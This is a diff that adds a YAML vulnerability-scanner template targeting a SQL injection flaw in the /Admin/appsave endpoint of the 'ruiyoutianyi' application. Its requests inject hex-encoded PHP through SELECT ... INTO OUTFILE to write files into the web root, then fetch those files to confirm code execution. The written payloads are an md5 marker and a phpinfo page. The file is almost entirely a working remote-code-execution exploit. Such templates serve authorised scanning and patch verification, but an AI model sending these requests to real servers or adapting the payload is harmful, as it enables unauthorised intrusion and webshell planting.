@@ -1,0 +1,43 @@
+name: poc-yaml-ruiyoutianyi-sql-RCE
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index.php?s=/Admin/appsave&appid=3%27%29%3Bselect+unhex%28%273c3f706870206563686f206d643528223122293b202466696c65203d205f5f46494c455f5f3b20756e6c696e6b282466696c65293b%27%29+into+outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5Cplom.xgi%27%23
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    expression: response.status == 200
+
+  r1:
+    request:
+      method: GET
+      path: /plom.xgi
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    expression: response.status == 200 && response.body.bcontains(b'c4ca4238a0b923820dcc509a6f75849b')
+
+  r2:
+    request:
+      method: GET
+      path: /hmrao.php?s=/Admin/appsave&appid=1%27%29%3Bselect%200x3c3f70687020706870696e666f28293b3f3e%20into%20outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5Cqwe.xgi%27%23
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    expression: response.status == 200
+
+  r3:
+    request:
+      method: GET
+      path: /qwe.xgi
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    expression: response.status == 200 && response.body.bcontains(b'phpinfo()') && response.body.bcontains(b'PHP Version')
+
+expression: r0() && r1() || r2() && r3()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139885924
+
